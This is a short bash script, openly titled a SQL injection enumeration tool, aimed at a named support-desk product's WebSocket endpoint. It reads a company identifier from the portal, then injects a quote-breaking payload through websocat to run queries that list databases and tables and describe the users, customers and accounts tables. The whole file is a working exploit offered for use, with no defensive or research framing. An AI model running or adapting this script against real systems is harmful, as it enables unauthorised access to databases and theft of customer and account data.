#!/bin/bash
company=$(curl -k -s https://support.customer.de/get_portal_info|cut -d'=' -f2|tail -n1|cut -d';' -f1|tr -d '\n\r')

echo "🔥 Customer SQLi Enumeration"
echo "Company: $company"

queries=(
    "show databases"
    "show tables" 
    "select table_name from information_schema.tables"
    "describe users"
    "describe customers" 
    "describe accounts"
)

for q in "${queries[@]}"; do
    echo -ne "\n[+] $q\n"
    echo -ne "1\n\n0\n\xC0';$q-- -\n" | websocat -k wss://support.customer.de/nw --protocol "ingredi support desk customer thin" -H "X-Ns-Company: $company" --binary -n --max-messages-rev 10
done
